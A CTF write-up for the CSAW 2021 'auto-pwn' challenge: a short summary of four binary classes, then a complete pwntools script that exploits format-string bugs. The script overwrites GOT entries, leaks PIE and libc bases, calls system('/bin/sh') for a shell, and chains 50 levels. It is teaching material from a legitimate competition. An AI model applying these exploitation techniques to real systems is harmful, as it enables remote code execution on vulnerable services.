```text
Oh noes! I partied all weekend and now it's an hour before the CTF ends and I have school deadlines tonight too. Can you help me write 60 reports and pwn 50 challenges by Sunday afternoon? nc auto-pwn.chal.csaw.io 11001 with password cd80d3cd8a479a18bbc9652f3631c61c
```

This was an automatic exploit generation challenge; there were four binary classes spread across 50 levels. Each binary was vulnerable to a format string exploit, with more and more mitigations as they got harder. 
1. 32-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function
2. 64-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function but had to construct the payload a little different bc of null bytes in 64-bit addresses. 
3. 64-bit; No PIE; Win function to shell; Stripped symbols so we had to locate the win function by searching for a string of bytes. 
4. 64-bit; PIE; No win function; We get three payloads. I leaked the program base and libc bases off the stack, overwrote GOT memset with system, and then passed "/bin/sh" for the last time -- calling system("/bin/sh"). 

```python
#!/usr/bin/env python3
from pwn import *
import os
import re
context.terminal = "kitty"
def exploit_1(port, password, shell):
    r = remote("auto-pwn.chal.csaw.io", port)
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    exe = ELF("binary")
    lower = (exe.sym['win'] - 10) & 0xffff
    upper = exe.sym['win'] >> 16
    payload = flat([
        b"BB",
        p32(exe.got['exit']),
        p32(exe.got['exit']+2),
        f"%{lower}c".encode(),
        b"%6$hn",
    ])
    open("payload.bin","wb").write(password + b"\n" + payload)
    r.sendline(payload)
    r.sendline("cat message.txt;ls;exit")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    # print()
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()
    return (int(searched.group(1)), searched.group(2).encode())
def exploit_2(port, password, shell):
    r = remote("auto-pwn.chal.csaw.io", port)
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    exe = ELF("binary")
    lower = (exe.sym['win'] - 10) & 0xffff
    upper = exe.sym['win'] >> 16
    payload = flat([
        f"%{exe.sym['win'] & 0xffff}c".encode(),
        b"C" * (8 - len(str(exe.sym['win'] & 0xffff)) + 1) ,
        b"%8$hn",
        p64(exe.got['exit']),
    ])
    open("payload.bin","wb").write(password + b"\n" + payload)
    r.sendline(payload)
    r.sendline("cat message.txt;ls;exit")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    # print()
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()
    return (int(searched.group(1)), searched.group(2).encode())
def exploit_3(port, password, shell):
    from binascii import unhexlify
    r = remote("auto-pwn.chal.csaw.io", port)
    # r = process("./binary")
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    exe = ELF("binary")
    win = next(exe.search(unhexlify("f30f1efa554889e5488d")))
    payload = flat([
        f"%{win & 0xffff}c".encode(),
        b"C" * (8 - len(str(win & 0xffff)) + 1) ,
        b"%8$hn",
        p64(exe.got['exit']),
    ])
    open("payload.bin","wb").write(password + b"\n" + payload)
    r.sendline(payload)
    r.sendline("cat message.txt;ls;exit")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    # print()
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()
    return (int(searched.group(1)), searched.group(2).encode())
def exploit_4(port, password, shell):
    from binascii import unhexlify
    r = remote("auto-pwn.chal.csaw.io", port)
    # r = gdb.debug("./binary",gdbscript="b fgets\nc")
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    # r.interactive()
    exe = ELF("binary")
    payload = b"%7$lx.%45$lx"
    f = open("payload.bin","wb")
    f.write(password + b"\n" + payload)
    r.sendline(payload)
    r.recvuntil(b"Report 1:\n")
    prog, libc = r.recvline().decode().split(".")
    program_base, libc_base = (int(prog, 16) - 0x374c, int(libc, 16) - 0x270b3)
    memset_got = program_base + 0x36b8
    system_addr = libc_base + 0x55410
    free_hook = libc_base + 0x000000000039b788
    one_gadget = libc_base + 0x3f35a
    log.info(f"program base: {hex(program_base)}, libc base: {hex(libc_base)}")
    log.info(f"memset_got: {hex(memset_got)}, system_addr: {hex(system_addr)}")
    context.bits = 64
    context.arch = 'amd64'
    def exec_fmt(payload):
        p = exe.process()
        p.sendline(password)
        p.recvuntil(b"Report 1 in this batch!!\n")
        p.sendline(payload)
        p.sendline()
        p.sendline()
        return p.recvall()
    
    payload = fmtstr_payload(8, {memset_got: system_addr}, write_size='byte')
    r.sendline(payload)
    r.sendline("/bin/sh")
    import time
    time.sleep(1)
    r.sendline("cat message.txt")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()
    return (int(searched.group(1)), searched.group(2).encode())
def main():
    number = 0
    data = [(11001,b"cd80d3cd8a479a18bbc9652f3631c61c")]
    for i in range(15):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_1(next_port, next_password, False)
        data.append((next_port, next_password))
        print((next_port, next_password))
    for i in range(15):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_2(next_port, next_password, False)
        data.append((next_port, next_password))
        print((next_port, next_password))
    for i in range(15):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_3(next_port, next_password, False)
        data.append((next_port, next_password))
        print((next_port, next_password))
    for i in range(16):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_4(next_port, next_password, number == 50)
        data.append((next_port, next_password))
        print((next_port, next_password))
if __name__ == "__main__":
    main()
```
![](/csaw-quals-2021/aeg_flag.png)